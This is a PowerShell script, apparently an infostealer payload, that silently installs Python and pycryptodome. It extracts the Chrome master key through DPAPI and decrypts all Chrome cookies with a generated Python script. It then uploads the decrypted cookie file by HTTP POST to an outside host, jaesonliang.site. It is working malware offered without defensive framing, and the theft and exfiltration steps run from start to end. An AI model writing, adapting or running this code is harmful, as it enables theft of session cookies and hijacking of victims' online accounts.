



Start-Sleep -Seconds 1  # Delay 




#install python
#winget install python.python.3.12
winget install --id Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements


#install pip
python -m ensurepip --upgrade


# Install pycryptodome
pip install pycryptodome


# Create decryptor.ps1
@'
param (
    [Parameter(Mandatory=$true)]
    [string]$InputFilePath,


    [Parameter(Mandatory=$true)]
    [string]$OutputFilePath
)


Add-Type -AssemblyName "System.Security"


$localStateContent = Get-Content -Path $InputFilePath -Raw


$matchFound = $localStateContent -match '"encrypted_key"\s*:\s*"([^"]+)"'


if (-not $matchFound) {
    Write-Error "Could not find 'encrypted_key' in the input file."
    exit
}


$encryptedKeyBase64 = $matches[1]
$encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKeyBase64)
$dpapiBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
$decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapiBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)


[System.IO.File]::WriteAllBytes($OutputFilePath, $decryptedBytes)
Write-Output "Master key written to $OutputFilePath"
'@ | Set-Content -Path "decryptor.ps1"


# Set variables
$curruser = $env:USERNAME
$inputFilePath = "C:\Users\$curruser\AppData\Local\Google\Chrome\User Data\Local State"
$outputFilePath = "C:\Users\$curruser\key.txt"


# Run decryptor
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
.\decryptor.ps1 -InputFilePath $inputFilePath -OutputFilePath $outputFilePath


# Create decryptCookie.py
@"
import os
import sqlite3
import shutil
from Crypto.Cipher import AES
import argparse
from datetime import datetime, timedelta


def chrome_time_conversion(chromedate):
    try:
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    except:
        return chromedate


def decrypt_value(buff, master_key):
    try:
        iv, payload = buff[3:15], buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return "Chrome < 80"


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Retrieve Encrypted Chrome Cookie Details.")
    parser.add_argument("-f", "--file", required=True, help="Path to the Chrome Cookies database.")
    parser.add_argument("-k", "--key", required=True, help="Path to the master key file.")
    parser.add_argument("-o", "--output", required=True, help="Path to the output text file.")
    args = parser.parse_args()


    with open(args.key, 'rb') as f:
        master_key = f.read()


    temp_db = "CookiesTemp.db"
    shutil.copy2(args.file, temp_db)


    grouped_data = {}


    with sqlite3.connect(temp_db) as conn:
        cursor = conn.cursor()
        for row in cursor.execute("SELECT host_key, name, encrypted_value, creation_utc, last_access_utc, expires_utc FROM cookies"):
            host_key = row[0]
            data = {
                'name': row[1],
                'decrypted_value': decrypt_value(row[2], master_key),
                'creation_utc': chrome_time_conversion(row[3]),
                'last_access_utc': chrome_time_conversion(row[4]),
                'expires_utc': chrome_time_conversion(row[5])
            }


            if host_key not in grouped_data:
                grouped_data[host_key] = []
            grouped_data[host_key].append(data)


    with open(args.output, 'w', encoding='utf-8') as output_file:
        for host, cookies in grouped_data.items():
            output_file.write("=" * 70 + "\n")
            output_file.write(f"Host: {host}\n")
            for cookie in cookies:
                output_file.write("\n")
                for key, val in cookie.items():
                    output_file.write(f"{key.title().replace('_', ' ')}: {val}\n")
            output_file.write("=" * 70 + "\n\n")


    print(f"Output written to {args.output}")
"@ | Set-Content -Path "decryptCookie.py"


# Run decryptCookie.py
$cookiesPath = "C:\Users\$curruser\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
$keyPath = "C:\Users\$curruser\key.txt"
$resultPath = "C:\Users\$curruser\result.txt"


python decryptCookie.py -f "$cookiesPath" -k "$keyPath" -o "$resultPath"


# Upload the file to a server
$filePath = $resultPath
$fileName = [System.IO.Path]::GetFileName($filePath)
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)
$fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)


$boundary = "----PowerShellBoundary$(Get-Random)"
$lf = "`r`n"


$bodyLines = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
    "Content-Type: text/plain",
    "",
    $fileContent,
    "--$boundary--",
    ""
)


$body = $bodyLines -join $lf
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)


$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}


$url = "https://jaesonliang.site/upload"
$response = Invoke-WebRequest -Uri $url -Method POST -Body $bodyBytes -Headers $headers




